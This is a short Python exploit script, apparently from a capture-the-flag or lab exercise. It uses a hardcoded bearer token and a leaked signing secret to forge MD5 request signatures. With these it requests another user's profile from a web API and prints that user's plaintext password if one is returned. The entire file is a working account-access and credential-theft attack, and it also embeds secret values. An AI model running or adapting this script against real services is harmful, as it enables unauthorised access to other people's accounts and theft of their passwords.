import requests
import hashlib
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzgwMDQxMDMyLCJpYXQiOjE3Nzk5OTc4MzIsImp0aSI6IjE3YTljZmViNjllYTRkMzU5M2MwN2MyMWEwMjQ4NDM4IiwidXNlcl9pZCI6IjUwMTc0NWZiLWVmNzktNDM2OS05ZTNjLTQwMTU0NTQzY2Q3OSJ9.m5Aw0boJRiyKZSU3vs0Q9VEeCLaE_eYSKTj71B4JlVA"
secret = "Th1$_1$_mY_$3Cr3t_3nCrYpt10N_k3Y"

body = {"id": "c150138a-fb84-491b-8880-3a852326fcd7"}
json_body = json.dumps(body)
sig = hashlib.md5((secret + json_body).encode()).hexdigest()

headers = {
    "Authorization": f"Bearer {token}",
    "X-Signature": sig,
    "Content-Type": "application/json"
}

response = requests.post("https://chortle.0hl.cc/api/profile/", json=body, headers=headers)
print(f"Status: {response.status_code}")
if response.status_code == 200:
    data = response.json()
    print(json.dumps(data, indent=2))
    if 'password' in data.get('data', {}):
        print(f"\n[!!!] Jason's plaintext password: {data['data']['password']}")
